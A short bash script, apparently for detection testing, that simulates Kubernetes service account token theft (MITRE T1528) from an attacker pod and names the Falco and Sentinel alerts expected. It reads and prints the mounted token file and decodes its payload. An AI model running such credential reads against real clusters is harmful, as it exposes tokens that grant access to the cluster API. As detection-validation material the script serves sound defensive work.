#!/bin/bash
# ============================================================================
# Attack Simulation: Service Account Token Theft
# MITRE ATT&CK: T1528 - Steal Application Access Token
# Run from: kubectl exec -it peirates -n attacker -- /bin/sh
# ============================================================================

echo "[*] Reading mounted service account token..."
cat /var/run/secrets/kubernetes.io/serviceaccount/token

echo ""
echo "[*] Decoding token header..."
token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
echo $token | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "Install python3 to decode"

echo ""
echo "[*] Token theft complete. Expected Falco alert: 'Read ServiceAccount Token in Container'"
echo "[*] Expected Sentinel table: ContainerLogV2 (via Falco) + AKSAudit"
